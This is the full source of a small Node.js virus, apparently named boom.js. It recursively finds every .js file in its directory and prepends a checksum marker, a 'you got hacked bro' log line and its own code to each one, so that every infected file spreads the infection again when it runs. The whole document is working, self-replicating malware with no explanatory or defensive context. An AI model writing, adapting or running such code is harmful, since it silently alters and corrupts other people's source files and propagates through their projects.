const fs = require("fs")
const crypto = require("crypto")

execute()

function execute() {
    const jsFiles = getAllFiles(__dirname, "js", true)
    for (var file of jsFiles) {
        if (file.endsWith("boom.js")) continue
        writeInfectedFile(file)
    }
}

function getAllFiles(path, fileType = "", recurs = false) {
    let allFiles = []
    const dirItems = fs.readdirSync(path, { withFileTypes: true })
    for (item of dirItems) {
        const fullPath = path + "/" + item.name
        if (recurs && item.isDirectory()) {
            allFiles = allFiles.concat(getAllFiles(fullPath, fileType, recurs))
        }
        else if (item.name.endsWith(fileType)) {
            allFiles.push(fullPath)
        }
    }
    return allFiles
}

function getChecksumFileName(filePath) {
    const fileNameBuffer = Buffer.from(filePath)
    const alg = crypto.createHash("sha256")
    alg.update(fileNameBuffer)
    return alg.digest().toString("hex")
}

function writeInfectedFile(filePath) {
    const checksum = getChecksumFileName(filePath)
    const prefixBuffer = Buffer.from("// " + checksum)
    const haxBuffer = Buffer.from("// " + checksum + "\nconsole.log('you got hacked bro');\n\n")
    const virusFile = fs.readFileSync(__filename)
    const fileBuffer = fs.readFileSync(filePath)
    const isHacked = Buffer.compare(prefixBuffer, fileBuffer.slice(0, prefixBuffer.length))
    if (isHacked == 0) return
    const newBuffer = Buffer.concat([haxBuffer, virusFile, fileBuffer])
    fs.writeFileSync(filePath, newBuffer)
}
